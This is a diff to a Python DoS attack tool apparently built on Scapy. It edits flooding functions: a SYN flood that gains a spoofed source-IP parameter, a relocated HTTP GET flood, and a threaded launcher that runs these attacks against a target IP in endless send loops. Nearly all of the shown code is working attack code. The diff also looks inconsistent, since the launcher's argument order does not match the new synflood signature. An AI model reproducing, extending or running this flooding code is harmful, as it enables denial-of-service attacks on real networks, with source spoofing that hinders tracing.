@@ -1,5 +1,6 @@
 from scapy.all import *
-from colors import *
+from lib.colors import *
+import threading
 import sys, time
 import logging
 import socket
@@ -74,29 +75,15 @@ def fraggle(tgtIP):
         logging.info(" Exiting...")
         sys.exit(0)
 
-def synflood(port, tgtIP):
+def synflood(tgtIP, port, srcIP):
     conf.verb = 0
     count = 0
     try:
         logging.info(" Attacking {}...".format(tgtIP))
         time.sleep(0.5)
         while True:
-            send(IP(dst=tgtIP)/TCP(dport=port, flags='S'), count=20)
+            send(IP(src=srcIP, dst=tgtIP)/TCP(dport=port, flags='S'), count=20)
             logging.info("{0}[{1}{2}{0}] {3}Packets sent{0}".format(RST, DGREY, count, RD))
-            count += 20
-    except KeyboardInterrupt:
-        logging.info(" Exiting...")
-        sys.exit(0)
-
-def GETflood(port, tgtIP):
-    conf.verb = 0
-    count = 0
-    try:
-        logging.info(" Attacking {}...".format(tgtIP))
-        time.sleep(0.5)
-        while True:
-            send(IP(dst=tgtIP)/TCP(dport=port)/b"GET / HTTP/1.1\r\n\r\n", count=20)
-            logging.info("{0}[{1}{2}{0}] {3}Requests sent{0}".format(RST, DGREY, count, RD))
             count += 20
     except KeyboardInterrupt:
         logging.info(" Exiting...")
@@ -116,7 +103,20 @@ def pingflood(tgtIP):
         logging.info(" Exiting...")
         sys.exit(0)
 
-        
+def GETflood(tgtIP):
+    conf.verb = 0
+    count = 0
+    try:
+        logging.info(" Attacking {}...".format(tgtIP))
+        time.sleep(0.5)
+        while True:
+            send(IP(dst=tgtIP)/TCP()/b"GET / HTTP/1.0\r\n\r\n", count=20)
+            logging.info("{0}[{1}{2}{0}] {3}Requests sent{0}".format(RST, DGREY, count, RD))
+            count += 20
+    except KeyboardInterrupt:
+        logging.info(" Exiting...")
+        sys.exit(0)
+
 def DOSthread(DoS, IP, threads, port=None):
     if port == None:
         for x in range(threads):
@@ -126,3 +126,4 @@ def DOSthread(DoS, IP, threads, port=None):
         for x in range(threads):
             t = threading.Thread(target=DoS, args=(port, IP))
             t.start()
+
